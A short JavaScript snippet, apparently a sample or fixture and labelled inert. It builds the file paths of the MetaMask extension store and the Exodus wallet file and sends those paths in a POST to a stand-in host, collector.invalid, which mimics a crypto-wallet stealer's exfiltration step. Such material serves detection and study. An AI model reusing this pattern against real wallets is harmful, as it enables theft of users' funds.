// inert: lists where a wallet stealer would look; hosts are .invalid
const fs = require("fs");
const dir = process.env.HOME + "/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn";
const exodus = process.env.HOME + "/.config/Exodus/exodus.wallet";
fetch("https://collector.invalid/up", { method: "POST", body: JSON.stringify({ dir, exodus }) });
